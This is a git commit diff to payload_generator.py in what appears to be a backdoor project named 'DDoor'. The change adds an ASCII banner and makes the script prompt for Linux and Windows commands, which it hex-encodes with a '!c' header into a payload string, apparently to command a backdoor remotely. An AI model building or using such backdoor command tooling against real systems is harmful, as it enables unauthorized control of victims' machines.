113e9a558ae8853b326abcedf0213f349df80f1b
rek7 <rek7@protonmail.com>
2019-11-13 20:28:36 -0500

    improved generator cli

--- payload_generator.py
+++ payload_generator.py
@@ -1,7 +1,22 @@
+#!/usr/bin/python3
 import binascii
+import colorama
 
+# http://patorjk.com/software/taag/#p=display&f=Poison&t=DDoor
+banner = colorama.Fore.GREEN +'''@@@@@@@   @@@@@@@    @@@@@@    @@@@@@   @@@@@@@   
+@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  
+@@!  @@@  @@!  @@@  @@!  @@@  @@!  @@@  @@!  @@@  
+!@!  @!@  !@!  @!@  !@!  @!@  !@!  @!@  !@!  @!@  
+@!@  !@!  @!@  !@!  @!@  !@!  @!@  !@!  @!@!!@!   
+!@!  !!!  !@!  !!!  !@!  !!!  !@!  !!!  !!@!@!    
+!!:  !!!  !!:  !!!  !!:  !!!  !!:  !!!  !!: :!!   
+:!:  !:!  :!:  !:!  :!:  !:!  :!:  !:!  :!:  !:!  
+ :::: ::   :::: ::  ::::: ::  ::::: ::  ::   :::  
+:: :  :   :: :  :    : :  :    : :  :    :   : :  ''' + colorama.Style.RESET_ALL
+
+print(banner)
 header = b"!c"
-linux_cmd = b"ps aux"
-windows_cmd = b"dir"
+linux_cmd = input("Linux Command> ").encode("utf-8")
+windows_cmd = input("Windows Command> ").encode("utf-8")
 encoded_header = binascii.hexlify(header + linux_cmd + b"!&" + windows_cmd).decode("utf-8")
-print("generated command: {}".format(encoded_header))
+print("\t>> {} <<".format(encoded_header))
